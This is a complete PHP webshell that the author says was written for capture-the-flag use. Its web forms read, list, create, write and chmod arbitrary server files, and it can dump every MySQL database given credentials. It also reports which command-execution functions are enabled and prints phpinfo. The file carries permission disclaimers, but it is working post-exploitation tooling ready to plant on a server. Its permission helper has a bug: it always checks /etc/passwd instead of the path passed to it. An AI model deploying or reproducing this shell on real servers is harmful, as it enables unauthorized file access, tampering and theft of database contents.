<?php

############################
#### DATABASE FUNCTIONS ####
############################

$db = [];
$information_schema=["CHARACTER_SETS", "COLLATIONS", "COLLATION_CHARACTER_SET_APPLICABILITY", "COLUMNS", "COLUMN_PRIVILEGES", "ENGINES", "EVENTS", "FILES", "GLOBAL_STATUS", "GLOBAL_VARIABLES", "KEY_COLUMN_USAGE", "OPTIMIZER_TRACE", "PARAMETERS", "PARTITIONS", "PLUGINS", "PROCESSLIST", "PROFILING", "REFERENTIAL_CONSTRAINTS", "ROUTINES", "SCHEMATA", "SCHEMA_PRIVILEGES", "SESSION_STATUS", "SESSION_VARIABLES", "STATISTICS", "TABLES", "TABLESPACES", "TABLE_CONSTRAINTS", "TABLE_PRIVILEGES", "TRIGGERS", "USER_PRIVILEGES", "VIEWS", "INNODB_LOCKS", "INNODB_TRX", "INNODB_SYS_DATAFILES", "INNODB_FT_CONFIG", "INNODB_SYS_VIRTUAL", "INNODB_CMP", "INNODB_FT_BEING_DELETED", "INNODB_CMP_RESET", "INNODB_CMP_PER_INDEX", "INNODB_CMPMEM_RESET", "INNODB_FT_DELETED", "INNODB_BUFFER_PAGE_LRU", "INNODB_LOCK_WAITS", "INNODB_TEMP_TABLE_INFO", "INNODB_SYS_INDEXES", "INNODB_SYS_TABLES", "INNODB_SYS_FIELDS", "INNODB_CMP_PER_INDEX_RESET", "INNODB_BUFFER_PAGE", "INNODB_FT_DEFAULT_STOPWORD", "INNODB_FT_INDEX_TABLE", "INNODB_FT_INDEX_CACHE", "INNODB_SYS_TABLESPACES", "INNODB_METRICS", "INNODB_SYS_FOREIGN_COLS", "INNODB_CMPMEM", "INNODB_BUFFER_POOL_STATS", "INNODB_SYS_COLUMNS", "INNODB_SYS_FOREIGN", "INNODB_SYS_TABLESTATS"];
$mysql=["COLUMNS_PRIV", "DB", "ENGINE_COST", "EVENT", "GENERAL_LOG", "GTID_EXECUTED", "HELP_CATEGORY", "HELP_KEYWORD", "HELP_RELATION", "HELP_TOPIC", "INNODB_INDEX_STATS", "INNODB_TABLE_STATS", "NDB_BINLOG_INDEX", "PLUGIN", "PROC", "PROCS_PRIV", "PROXIES_PRIV", "SERVER_COST", "SERVERS", "SLAVE_MASTER_INFO", "SLAVE_RELAY_LOG_INFO", "SLAVE_WORKER_INFO", "SLOW_LOG", "TABLES_PRIV", "TIME_ZONE", "TIME_ZONE_LEAP_SECOND", "TIME_ZONE_NAME", "TIME_ZONE_TRANSITION", "TIME_ZONE_TRANSITION_TYPE", "USER"];
$performance_schema=["ACCOUNTS", "COND_INSTANCES", "EVENTS_STAGES_CURRENT", "EVENTS_STAGES_HISTORY", "EVENTS_STAGES_HISTORY_LONG", "EVENTS_STAGES_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME", "EVENTS_STAGES_SUMMARY_BY_HOST_BY_EVENT_NAME", "EVENTS_STAGES_SUMMARY_BY_THREAD_BY_EVENT_NAME", "EVENTS_STAGES_SUMMARY_BY_USER_BY_EVENT_NAME", "EVENTS_STAGES_SUMMARY_GLOBAL_BY_EVENT_NAME", "EVENTS_STATEMENTS_CURRENT", "EVENTS_STATEMENTS_HISTORY", "EVENTS_STATEMENTS_HISTORY_LONG", "EVENTS_STATEMENTS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME", "EVENTS_STATEMENTS_SUMMARY_BY_DIGEST", "EVENTS_STATEMENTS_SUMMARY_BY_HOST_BY_EVENT_NAME", "EVENTS_STATEMENTS_SUMMARY_BY_PROGRAM", "EVENTS_STATEMENTS_SUMMARY_BY_THREAD_BY_EVENT_NAME", "EVENTS_STATEMENTS_SUMMARY_BY_USER_BY_EVENT_NAME", "EVENTS_STATEMENTS_SUMMARY_GLOBAL_BY_EVENT_NAME", "EVENTS_TRANSACTIONS_CURRENT", "EVENTS_TRANSACTIONS_HISTORY", "EVENTS_TRANSACTIONS_HISTORY_LONG", "EVENTS_TRANSACTIONS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME", "EVENTS_TRANSACTIONS_SUMMARY_BY_HOST_BY_EVENT_NAME", "EVENTS_TRANSACTIONS_SUMMARY_BY_THREAD_BY_EVENT_NAME", "EVENTS_TRANSACTIONS_SUMMARY_BY_USER_BY_EVENT_NAME", "EVENTS_TRANSACTIONS_SUMMARY_GLOBAL_BY_EVENT_NAME", "EVENTS_WAITS_CURRENT", "EVENTS_WAITS_HISTORY", "EVENTS_WAITS_HISTORY_LONG", "EVENTS_WAITS_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME", "EVENTS_WAITS_SUMMARY_BY_HOST_BY_EVENT_NAME", "EVENTS_WAITS_SUMMARY_BY_INSTANCE", "EVENTS_WAITS_SUMMARY_BY_THREAD_BY_EVENT_NAME", "EVENTS_WAITS_SUMMARY_BY_USER_BY_EVENT_NAME", "EVENTS_WAITS_SUMMARY_GLOBAL_BY_EVENT_NAME", "FILE_INSTANCES", "FILE_SUMMARY_BY_EVENT_NAME", "FILE_SUMMARY_BY_INSTANCE", "GLOBAL_STATUS", "GLOBAL_VARIABLES", "HOST_CACHE", "HOSTS", "MEMORY_SUMMARY_BY_ACCOUNT_BY_EVENT_NAME", "MEMORY_SUMMARY_BY_HOST_BY_EVENT_NAME", "MEMORY_SUMMARY_BY_THREAD_BY_EVENT_NAME", "MEMORY_SUMMARY_BY_USER_BY_EVENT_NAME", "MEMORY_SUMMARY_GLOBAL_BY_EVENT_NAME", "METADATA_LOCKS", "MUTEX_INSTANCES", "OBJECTS_SUMMARY_GLOBAL_BY_TYPE", "PERFORMANCE_TIMERS", "PREPARED_STATEMENTS_INSTANCES", "REPLICATION_APPLIER_CONFIGURATION", "REPLICATION_APPLIER_STATUS", "REPLICATION_APPLIER_STATUS_BY_COORDINATOR", "REPLICATION_APPLIER_STATUS_BY_WORKER", "REPLICATION_CONNECTION_CONFIGURATION", "REPLICATION_CONNECTION_STATUS", "REPLICATION_GROUP_MEMBER_STATS", "REPLICATION_GROUP_MEMBERS", "RWLOCK_INSTANCES", "SESSION_ACCOUNT_CONNECT_ATTRS", "SESSION_CONNECT_ATTRS", "SESSION_STATUS", "SESSION_VARIABLES", "SETUP_ACTORS", "SETUP_CONSUMERS", "SETUP_INSTRUMENTS", "SETUP_OBJECTS", "SETUP_TIMERS", "SOCKET_INSTANCES", "SOCKET_SUMMARY_BY_EVENT_NAME", "SOCKET_SUMMARY_BY_INSTANCE", "STATUS_BY_ACCOUNT", "STATUS_BY_HOST", "STATUS_BY_THREAD", "STATUS_BY_USER", "TABLE_HANDLES", "TABLE_IO_WAITS_SUMMARY_BY_INDEX_USAGE", "TABLE_IO_WAITS_SUMMARY_BY_TABLE", "TABLE_LOCK_WAITS_SUMMARY_BY_TABLE", "THREADS", "USER_VARIABLES_BY_THREAD", "USERS", "VARIABLES_BY_THREAD"];
$sys=['HOST_SUMMARY', 'HOST_SUMMARY_BY_FILE_IO', 'HOST_SUMMARY_BY_FILE_IO_TYPE', 'HOST_SUMMARY_BY_STAGES', 'HOST_SUMMARY_BY_STATEMENT_LATENCY', 'HOST_SUMMARY_BY_STATEMENT_TYPE', 'INNODB_BUFFER_STATS_BY_SCHEMA', 'INNODB_BUFFER_STATS_BY_TABLE', 'INNODB_LOCK_WAITS', 'IO_BY_THREAD_BY_LATENCY', 'IO_GLOBAL_BY_FILE_BY_BYTES', 'IO_GLOBAL_BY_FILE_BY_LATENCY', 'IO_GLOBAL_BY_WAIT_BY_BYTES', 'IO_GLOBAL_BY_WAIT_BY_LATENCY', 'LATEST_FILE_IO', 'MEMORY_BY_HOST_BY_CURRENT_BYTES', 'MEMORY_BY_THREAD_BY_CURRENT_BYTES', 'MEMORY_BY_USER_BY_CURRENT_BYTES', 'MEMORY_GLOBAL_BY_CURRENT_BYTES', 'MEMORY_GLOBAL_TOTAL', 'METRICS', 'PROCESSLIST', 'PS_CHECK_LOST_INSTRUMENTATION', 'SCHEMA_AUTO_INCREMENT_COLUMNS', 'SCHEMA_INDEX_STATISTICS', 'SCHEMA_OBJECT_OVERVIEW', 'SCHEMA_REDUNDANT_INDEXES', 'SCHEMA_TABLE_LOCK_WAITS', 'SCHEMA_TABLE_STATISTICS', 'SCHEMA_TABLE_STATISTICS_WITH_BUFFER', 'SCHEMA_TABLES_WITH_FULL_TABLE_SCANS', 'SCHEMA_UNUSED_INDEXES', 'SESSION', 'SESSION_SSL_STATUS', 'STATEMENT_ANALYSIS', 'STATEMENTS_WITH_ERRORS_OR_WARNINGS', 'STATEMENTS_WITH_FULL_TABLE_SCANS', 'STATEMENTS_WITH_RUNTIMES_IN_95TH_PERCENTILE', 'STATEMENTS_WITH_SORTING', 'STATEMENTS_WITH_TEMP_TABLES', 'SYS_CONFIG', 'USER_SUMMARY', 'USER_SUMMARY_BY_FILE_IO', 'USER_SUMMARY_BY_FILE_IO_TYPE', 'USER_SUMMARY_BY_STAGES', 'USER_SUMMARY_BY_STATEMENT_LATENCY', 'USER_SUMMARY_BY_STATEMENT_TYPE', 'VERSION', 'WAIT_CLASSES_GLOBAL_BY_AVG_LATENCY', 'WAIT_CLASSES_GLOBAL_BY_LATENCY', 'WAITS_BY_HOST_BY_LATENCY', 'WAITS_BY_USER_BY_LATENCY', 'WAITS_GLOBAL_BY_LATENCY', 'X$HOST_SUMMARY', 'X$HOST_SUMMARY_BY_FILE_IO', 'X$HOST_SUMMARY_BY_FILE_IO_TYPE', 'X$HOST_SUMMARY_BY_STAGES', 'X$HOST_SUMMARY_BY_STATEMENT_LATENCY', 'X$HOST_SUMMARY_BY_STATEMENT_TYPE', 'X$INNODB_BUFFER_STATS_BY_SCHEMA', 'X$INNODB_BUFFER_STATS_BY_TABLE', 'X$INNODB_LOCK_WAITS', 'X$IO_BY_THREAD_BY_LATENCY', 'X$IO_GLOBAL_BY_FILE_BY_BYTES', 'X$IO_GLOBAL_BY_FILE_BY_LATENCY', 'X$IO_GLOBAL_BY_WAIT_BY_BYTES', 'X$IO_GLOBAL_BY_WAIT_BY_LATENCY', 'X$LATEST_FILE_IO', 'X$MEMORY_BY_HOST_BY_CURRENT_BYTES', 'X$MEMORY_BY_THREAD_BY_CURRENT_BYTES', 'X$MEMORY_BY_USER_BY_CURRENT_BYTES', 'X$MEMORY_GLOBAL_BY_CURRENT_BYTES', 'X$MEMORY_GLOBAL_TOTAL', 'X$PROCESSLIST', 'X$PS_DIGEST_95TH_PERCENTILE_BY_AVG_US', 'X$PS_DIGEST_AVG_LATENCY_DISTRIBUTION', 'X$PS_SCHEMA_TABLE_STATISTICS_IO', 'X$SCHEMA_FLATTENED_KEYS', 'X$SCHEMA_INDEX_STATISTICS', 'X$SCHEMA_TABLE_LOCK_WAITS', 'X$SCHEMA_TABLE_STATISTICS', 'X$SCHEMA_TABLE_STATISTICS_WITH_BUFFER', 'X$SCHEMA_TABLES_WITH_FULL_TABLE_SCANS', 'X$SESSION', 'X$STATEMENT_ANALYSIS', 'X$STATEMENTS_WITH_ERRORS_OR_WARNINGS', 'X$STATEMENTS_WITH_FULL_TABLE_SCANS', 'X$STATEMENTS_WITH_RUNTIMES_IN_95TH_PERCENTILE', 'X$STATEMENTS_WITH_SORTING', 'X$STATEMENTS_WITH_TEMP_TABLES', 'X$USER_SUMMARY', 'X$USER_SUMMARY_BY_FILE_IO', 'X$USER_SUMMARY_BY_FILE_IO_TYPE', 'X$USER_SUMMARY_BY_STAGES', 'X$USER_SUMMARY_BY_STATEMENT_LATENCY', 'X$USER_SUMMARY_BY_STATEMENT_TYPE', 'X$WAIT_CLASSES_GLOBAL_BY_AVG_LATENCY', 'X$WAIT_CLASSES_GLOBAL_BY_LATENCY', 'X$WAITS_BY_HOST_BY_LATENCY', 'X$WAITS_BY_USER_BY_LATENCY', 'X$WAITS_GLOBAL_BY_LATENCY'];

function getData($dbh, $columns, $tablename, $dbname){
  global $db;
  $columns_str = implode(",", $columns);
  $sql = "SELECT $columns_str FROM $dbname.$tablename;";
  #echo $sql."\n";
  foreach ($dbh->query($sql) as $row) {
    array_push($db[$dbname][$tablename]["data"], array());
    echo "<tr>\n";
    foreach ($columns as &$colname){
      $c = count($db[$dbname][$tablename]["data"]);
      $db[$dbname][$tablename]["data"][$c-1][$colname] = $row[$colname];
      echo "\t<td>".$row[$colname]."</td>\n";
    }
    echo "</tr>\n";
  }
}

function getColumns($dbh, $tablename, $dbname){
  global $db;
  $sql = "SELECT column_name FROM information_schema.columns WHERE table_name='$tablename' and table_schema='$dbname';";
  #echo $sql."\n";
  echo "<div id='$tablename.$dbname'>";
  echo '<table style="width:100%">'."\n";
  echo "<tr>\n";
  foreach ($dbh->query($sql) as $row) {
    array_push($db[$dbname][$tablename]["columns"], $row['column_name']);
    echo "\t<th>".$row['column_name']."</th>\n";
  }
  echo "</tr>\n";
  getData($dbh, $db[$dbname][$tablename]["columns"], $tablename, $dbname);
  echo "</table></div>\n";
  echo "<br>\n";
}

function getTables($dbh, $dbname, $checkDefault) {
  global $db, $information_schema, $mysql, $performance_schema, $sys;
  $sql = "SELECT table_name FROM information_schema.tables WHERE table_schema='$dbname';";
  #echo $sql."\n";
  foreach ($dbh->query($sql) as $row) {
    $db[$dbname][$row['table_name']]["columns"] = array();
    $db[$dbname][$row['table_name']]["data"] = array();
    if (! $checkDefault){
      if ($dbname === "information_schema" && in_array(strtoupper($row['table_name']),$information_schema)){
        continue;
      }
      elseif ($dbname === "mysql" && in_array(strtoupper($row['table_name']),$mysql)){
        continue;
      }
      elseif ($dbname === "performance_schema" && in_array(strtoupper($row['table_name']),$performance_schema)){
        continue;
      }
      elseif ($dbname === "sys" && in_array(strtoupper($row['table_name']),$sys)){
        continue;
      }
    }
    echo "<h3>Table: ".$row['table_name']."</h3><br>";
    getColumns($dbh, $row['table_name'], $dbname);
  }
}

function dumpDb($mysqlUserName, $mysqlPassword, $mysqlHostName, $checkDefault){
  global $db;
  $dbh = new PDO("mysql:host=$mysqlHostName;",$mysqlUserName, $mysqlPassword);
  $sql = $dbh->query('SHOW DATABASES');
  $dbnames_results = $sql->fetchAll();

  foreach ($dbnames_results as &$dbname) {
    $db[$dbname[0]] = array();
    echo "<h2>Database: ".$dbname[0]."</h2><br>";
    getTables($dbh, $dbname[0], $checkDefault);
  }
}


################################
##### FILESYSTEM FUNCTIONS #####
################################

function printPerms($filepath){
  $perms = fileperms('/etc/passwd');

  switch ($perms & 0xF000) {
      case 0xC000: // socket
          $info = 's';
          break;
      case 0xA000: // symbolic link
          $info = 'l';
          break;
      case 0x8000: // regular
          $info = 'r';
          break;
      case 0x6000: // block special
          $info = 'b';
          break;
      case 0x4000: // directory
          $info = 'd';
          break;
      case 0x2000: // character special
          $info = 'c';
          break;
      case 0x1000: // FIFO pipe
          $info = 'p';
          break;
      default: // unknown
          $info = 'u';
  }

  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

  echo "$info $filepath\n";
}


function listDir($dir){
  echo "Listing $dir\n";
  $filenames  = scandir($dir);
  foreach ($filenames as $filename) {
    if ($filename != "." && $filename != ".."){
      $filepath = "$dir/$filename";
      printPerms($filepath);
    }
  }
}

function readAFile($filepath){
  if (file_exists($filepath)){
    if (is_readable($filepath)) {
      echo "Reading $filepath\n";
      echo file_get_contents($filepath);
    }
    else{
      echo "$filepath: Permission denied\n";
    }
  }
  else{
    echo "$filepath: File doesn't exist\n";
  }
}

function writeAFile($filepath, $content){
  file_put_contents($filepath, $content);
}

function createADir($dirpath, $perms){
  if (! mkdir($dirpath, intval($perms, 8))){
    echo "Error creating the folder $dirpath\n";
  }
  else{
    echo "$dirpath was created\n";
  }
}

function changePerms($dirpath, $perms){
  if (! chmod($dirpath, intval($perms, 8))){
    echo "Error changing permissions of $dirpath\n";
  }
  else{
    echo "Permissions of $dirpath changed correctly\n";
  }
}



####################################
######### CHECK FUNCTIONS ##########
####################################

function check_exec_function($disabled, $func){
  if (!in_array($func, $disabled)){
    echo "<div style='color:red;'>$func is enabled!!</div>\n";
  }
  else{
    echo "<div style='color:green;'>$func is disabled</div>\n";
  }
}

function check_exec_functions() {
  $disabled = explode(',', ini_get('disable_functions'));
  $funcs = ["exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec", "mail", "putenv"];
  foreach ($funcs as $func) {
    check_exec_function($disabled, $func);
  }
}

?>

<body style="margin:20;padding:5">
<pre>
<b>Disclaimer: Always use this webshell with permission of the servers owner.</b>
<h1> Filesystem Interaction </h1>
<form method="post">
Read File: <input type="text" id="readfile" name="readfile"><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["readfile"])){ readAFile($_POST["readfile"]); } ?>
<br>
<form method="post">
List Dir: <input type="text" id="listdir" name="listdir"><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["listdir"])){ listDir($_POST["listdir"]); } ?>
<br>
<form method="post">
Create Dir: <input type="text" id="dirpath" name="dirpath">  Perms: <input type="text" id="dirperms" name="dirperms" value="0777"> <input type="submit" value="Submit">
</form>
<?php if (isset($_POST["dirpath"]) && isset($_POST["dirperms"])){ createADir($_POST["dirpath"], $_POST["dirperms"]); } ?>
<br>
<form method="post">
Change Perms: <input type="text" id="permspath" name="permspath">  Perms: <input type="text" id="perms" name="perms" value="0600"> <input type="submit" value="Submit">
</form>
<?php if (isset($_POST["permspath"]) && isset($_POST["perms"])){ changePerms($_POST["permspath"], $_POST["perms"]); } ?>
<br>
<form method="post">
Write file: <input type="text" id="filepath" name="filepath"><br>Content: <br><textarea rows="10" cols="100" name="content"></textarea> <br><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["filepath"]) && isset($_POST["content"])){ writeAFile($_POST["filepath"], $_POST["content"]); } ?>
<br>
<h1> Disabled functions </h1>
<?php check_exec_functions(); ?>
<br>
<h1> Mysql Dump </h1>
Note that this will dump the WHOLE DATABASE. I have created this webshell for CTFs, DO NOT USE THIS IN PRODUCTION ENVIRONMENTS.
<form method="post">
Mysql Username: <input type="text" id="mysqlusername" name="mysqlusername" value="root"><br>
Mysql Password: <input type="text" id="mysqlpassword" name="mysqlpassword"><br>
Mysql Host: <input type="text" id="mysqlhost" name="mysqlhost" value="localhost"><br>
<input type="checkbox" id="dumpdefault" name="dumpdefault" value="yes"> Dump default  MySQL databases <i>(information_schema, mysql, performance_schema, sys) </i>. Note that by default only non-default tables from these databases will be extracted.<br>
<input type="submit" value="Dump Mysql">
</form>
<?php if (isset($_POST["mysqlusername"]) && isset($_POST["mysqlpassword"]) && isset($_POST["mysqlhost"])){ echo $_POST["dumpdefault"]."\n"; dumpDb($_POST["mysqlusername"], $_POST["mysqlpassword"], $_POST["mysqlhost"], isset($_POST["dumpdefault"])); } ?>
</pre>
<h1> PHPInfo </h1>
<?php phpinfo(); ?>
</body>
